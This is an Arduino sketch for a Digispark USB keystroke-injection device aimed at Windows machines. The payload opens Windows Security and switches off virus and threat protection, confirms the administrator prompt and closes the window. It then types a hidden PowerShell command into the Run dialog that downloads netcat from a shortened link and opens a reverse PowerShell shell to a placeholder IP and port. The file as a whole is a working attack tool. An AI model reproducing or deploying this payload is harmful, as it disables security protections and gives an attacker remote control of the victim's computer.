
&lt;pre&gt;
#include "DigiKeyboard.h"

void setup()
{
  DigiKeyboard.delay(1000);                        // sleep => 1 s
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT); // press key => S + GUI
  DigiKeyboard.delay(1000);                        // sleep => 1 s
  DigiKeyboard.print("virus &amp; threat protection"); // writing => virus &amp; threat protection
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // press key => ENTER
  DigiKeyboard.delay(5000);              // sleep => 5s
  DigiKeyboard.sendKeyStroke(43);        // press key => TAP
  DigiKeyboard.sendKeyStroke(43);        // press key => TAP
  DigiKeyboard.sendKeyStroke(43);        // press key => TAP
  DigiKeyboard.sendKeyStroke(43);        // press key => TAP
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // press key => Y + ALT
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // press key => F4 + ALT
  DigiKeyboard.delay(500);
  // --------------------------------------------------------------------
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // press key => GUI + R
  DigiKeyboard.delay(700);
  DigiKeyboard.print("powershell curl -o netcat.exe https://bit.ly/3G3R1d1 ; powershell -w hidden netcat.exe &lt;ip&gt; &lt;port&gt; -e powershell.exe"); // writing => powershell .......
  DigiKeyboard.sendKeyStroke(KEY_ENTER);                                                                                                      // press key => ENTER
}

void loop()
{
}
&lt;/pre&gt;
